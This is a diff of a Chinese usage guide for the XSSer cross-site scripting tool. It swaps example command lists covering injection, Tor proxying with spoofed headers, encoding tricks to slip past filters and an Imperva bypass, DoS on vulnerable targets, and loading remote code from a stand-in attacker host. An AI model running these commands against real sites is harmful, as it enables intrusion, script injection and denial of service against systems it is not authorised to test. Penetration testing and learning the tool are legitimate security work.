@@ -6,70 +6,33 @@
 
 二.用法
 	
-		*查看帮助
-		xsser -h (--help)
+			
+		*向导攻击
+		xsser --wizard
 
-		*更新
-		xsser --update
+		*从一个链接简单注入,url的payload
+		xsser -u "http://host.com" --payload "!enter your injection code here!"
 
-		*从一个链接简单注入
-		xsser -u "http://host.com"
+		*从文件获取url简单的注射,使用Tor代理和欺骗HTTP引用页头,改变你的 HTTP User-Agent header , 改变超时“20”
+		xsser -i "file.txt" --proxy "http://127.0.0.1:8118" --referer "666.666.666.666" --user-agent "XSSer Pentesting Tool" --timeout "20"
 
-		*从文件获取url简单的注射,使用Tor代理和欺骗HTTP引用页头
-		xsser -i "file.txt" --proxy "http://127.0.0.1:8118" --referer "666.666.666.666" 
+		*多个注射URL,使用不同的字符编码(1.改变负载为十六进制;2.使用 String.FromCharCode()方法编码;3.重编码为16进制,4.十进制编译,5.使用Unescape()方法，
+		6.16进制分号,7.编译IP地址，8.使用String.FromCharCode() and Unescape()),使用多线程线程(5):
+		xsser -u "http://host.com" --Cem "Hex,Str,Hex,Dex,Une,Hes,Doo,Mix"   --threads "5"
 
-		*从URL多次注射,使用自动攻击载荷,建立反向连接和统计数据显示:
-		xsser -u "http://host.com" --auto --reverse-check -s
+		*详细输出和结果保存到文件(XSSreport.raw):
+		xsser -u "http://host.com"  --save
 
-		*从URL多次注射,使用自动攻击负载,使用Tor代理,使用十六进制编码,详细输出和结果保存到文件(XSSreport.raw):
-		xsser -u "http://host.com" --auto --proxy "http://127.0.0.1:8118" --Hex --verbose --save
+		*当payload有用时，利用“拥有”远程代码
+		xsser -u "http://host.com"  --Fr "https://attacker_server.org/path/code.js"
 
-		*多个注射URL,使用自动负载,使用不同的字符编码(1.改变负载为十六进制;2.使用 String.FromCharCode()方法编码;3.重编码为16进制),
-		改变你的 HTTP User-Agent header,改变超时“20”,使用多线程线程(5):
-		xsser -u "http://host.com" --auto --Cem "Hex,Str,Hex" --user-agent "XSSer Pentesting Tool" --timeout "20" --threads "5"
+		*当payload有用时，利用本地代码
+		xsser -u "http://host.com"  --Fp "<script>alert('xss')</script>"
+		
+		*从URL简单的注射,使用GET和如果存在任何漏洞,发起DoS，Doss（攻击服务器）:
+		xsser -u "http://host.com"  --Dos（攻击浏览器）
 
-		*从文件获取url注射,使用特定的有效载荷和使用Unescape()字符编码绕过过滤器:
-		xsser -i "urls.txt" --payload "!enter your injection code here!" --Une
 
-		*傻瓜式注射,选择“谷歌”搜索引擎:
-		xsser --De "google" -d "search.php?q="
-
-		*使用从自带的列表中傻瓜式注射
-		xsser -l --Da
-
-		*目标URL的爬行数目3个， 爬行深度（1-5）为4
-		xsser -c3 --Cw=4 -u "http://host.com"
-
-		*从URL简单的注射POST参数(例:密码),和统计结果
-		xsser -u "http://host.com/index.php" -p "target=login&user=admin&password=" -s
-
-		*从URL简单的注射,使用GET方法注射在cookie上与dom注射,如果存在任何漏洞,利用你自己的注入恶意代码:
-		xsser -u "http://host.com" -g "/path?vuln=" --Coo --Dom --Fp="!enter your injection code here!"
-
-		*从URL简单的注射,使用GET和如果存在任何漏洞,发起DoS:
-		xsser -u "http://host.com" -g "/path?vuln=" --Dos
-
-		*多个注射多个地方,从一个文件中提取目标,应用自动负载,改变超时“20”,使用多线程线程(5),增加请求之间延迟到10秒,注入参数
-		的HTTP USer-Agent,Referer and Cookies,使用代理Tor,IP八进制编码,统计结果和使用详细模式:
-		xsser -i "list_of_url_targets.txt" --auto --timeout "20" --threads "5" --delay "10" --Xsa --Xsr --Coo 
-		--proxy "http://127.0.0.1:8118" --Doo -s --verbose
-
-		*注入的XSS代码由用户提供一个图片
-		xsser --Imx "test.png" --payload "!enter your injection code here!" 
-
-		*利用搜索引擎找出有问题的链接并保存为xml文件
-		xsser -d "login.php" --Da --xml "security_report_XSSer_Dork_login-php_allengines.xml" 
-
-		*创建一个标准XSS代码嵌入Flash影片
-		xsser --fla "movie.swf"
-
-		*利用Base64编码的代码META标签(rfc2397)注入后手动负载:
-		xsser -u "http://host.com" -g "/path?vuln=" --payload "!enter your injection code here!" --B64
-
-		*利用“拥有”远程代码
-		xsser -u "http://host.com" -g "/path?vuln=" --auto --Fr "https://attacker_server.org/path/code.js"
-
-		*应用Anti-antiXSS而是(例:Imperva)之前将你自己的代码和使用详细的输出:
-		xsser -u "http://host.com" -g "/path?vuln=" --Imperva --payload "!enter your injection code here!" -v
+		
 
 
